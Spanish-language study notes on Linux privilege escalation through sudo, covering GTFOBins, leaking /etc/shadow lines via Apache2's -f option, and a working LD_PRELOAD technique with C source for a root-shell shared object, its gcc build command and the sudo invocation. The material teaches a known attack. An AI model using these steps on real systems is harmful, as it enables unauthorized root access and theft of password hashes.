---
layout: apunte
title: "5. Privilege Escalation - Sudo"
---

El comando `sudo` te permite ejecutar un programa con permisos de administrador. Bajo ciertas circunstancias, los sysadmins pueden necesitar flexibilizar los permisos de ciertos usuarios como por ejemplo si un analista SOC junior necesita usar Nmap pero no debe tener permisos root completos. El administrador del sistema puede permitir a este usuario ejecutar sólo Nmap con `sudo`.

Cualquier usuario puede comprobar su relación con `sudo` mediante el comando `sudo -l`.

[GTFOBins](https://gtfobins.github.io/) es un recurso valioso que ofrece información de cómo un programa con permisos sudo puede usarse para escalar privilegios.

------------------------------------
<h2>Usar las Funciones de una Aplicación</h2>
Algunas aplicaciones no tendrán un exploit conocido en este contexto. Una de estas es Apache2.

En este caso podemos usar un "hack" para filtrar información gracias a usar una función de la aplicación. Como puedes ver abajo, Apache2 tiene una opción que permite cargar archivos de configuración adicionales con `-f`.

!**Pasted image 20251127103322.png**

Cargar el archivo `/etc/shadow` usando esta opción, resultará en un error que incluye las primeras líneas del archivo `/etc/shadow`.

---------------------------------------
<h2>Usar LD_PRELOAD</h2>
En algunos sistemas, puedes ver la opción de entorno LD_PRELOAD.

!**Pasted image 20251127104748.png**

LD_PRELOAD es una función que permite a cualquier programa usar librerías compartidas. Si la opción "env_keep" está habilitada, podemos generar una librería compartida que será cargada y ejecutada antes de que el programa se ejecute.

>[!CAUTION] La opción LD_PRELOAD será ignorada si el ID del usuario real es diferente del ID del usuario efectivo.

Los pasos de escalada de privilegios de este vector son:

1. Comprobar si hay LD_PRELOAD (con la opción env_keep).
2. Escribir un código C simple compilado como share object (`.so`).
3. Ejecutar el programa con permisos sudo y la opción LD_PRELOAD apuntando a nuestro archivo `.so`.

El código C cargará una consola root que puede escribirse de la siguiente manera:

```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```

Puedes guardar este código como `shell.c` y compilarlo usando `gcc` en un shared object usando los siguientes parámetros:

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

!**Pasted image 20251127113835.png**

Podemos ahora usar este shared object al lanzar cualquier programa que nuestro usuario pueda ejecutar con sudo. En nuestro caso, Apache2, find, o casi cualquier programa que podamos ejecutar con sudo.

Necesitamos ejecutar el programa especificando la opción LD_PRELOAD de la siguiente manera:

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

El resultado es una shell root:

!**Pasted image 20251127115916.png**